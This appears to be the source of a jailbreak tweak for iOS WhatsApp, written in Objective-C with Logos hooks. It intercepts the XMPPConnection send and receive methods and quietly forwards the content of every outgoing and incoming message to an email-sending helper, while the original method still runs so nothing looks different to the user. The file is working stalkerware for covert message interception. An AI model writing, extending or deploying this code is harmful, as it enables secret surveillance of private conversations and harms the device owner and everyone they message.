#import "sendEmail.h"
//#import "CkoEmail.h"
//#import "CkoMailMan.h"

%hook XMPPConnection

- (void)sendMessage:(id)arg1{
	%log;
	//NSString* str1 = @"test";
	//NSString* str1 = (NSString*)arg1;
	NSString *str1 = [arg1 text];
	[sendEmail doThis:str1:@"Outgoing WhatsApp Message"];
	return %orig;
}
		

-(void)processIncomingMessages:(id)arg1 {
	%log;
	//NSString* str1 = @"test";
	//NSString *str1 = [arg1 type];
	NSString *str1 = [NSString stringWithFormat:@"%@",arg1];
	[sendEmail doThis:str1:@"Incoming WhatsApp Message"];
	return %orig;
}


%end
